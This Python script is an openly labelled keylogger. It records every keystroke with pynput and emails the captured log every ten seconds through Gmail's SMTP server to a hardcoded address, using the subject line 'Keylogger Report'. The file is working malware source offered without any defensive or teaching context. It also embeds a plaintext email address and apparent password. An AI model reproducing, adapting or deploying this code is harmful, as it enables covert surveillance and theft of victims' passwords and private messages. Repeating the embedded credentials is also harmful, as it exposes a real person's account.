import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener
import threading
import time

# Email configuration
email_address = "chriskaridis5@gmail.com"
email_password = "x05042004k"
receiver_email = "chriskaridis5@gmail.com"

# Keylogger variables
log = ""
send_interval = 10  # Send email every 10 sec

# Function to send email
def send_email():
    global log
    if log:
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = receiver_email
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(log, 'plain'))
        
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_address, email_password)
            server.send_message(msg)
            server.quit()
            print("Email sent successfully")
        except Exception as e:
            print(f"Failed to send email: {e}")
        log = ""  # Clear log after sending email

# Function to log key presses
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        else:
            log += f"[{key}]"

# Function to start listener
def start_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to periodically send email
def send_periodic_email():
    while True:
        send_email()
        time.sleep(send_interval)

# Start keylogger listener
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Start email sender thread
email_thread = threading.Thread(target=send_periodic_email)
email_thread.start()
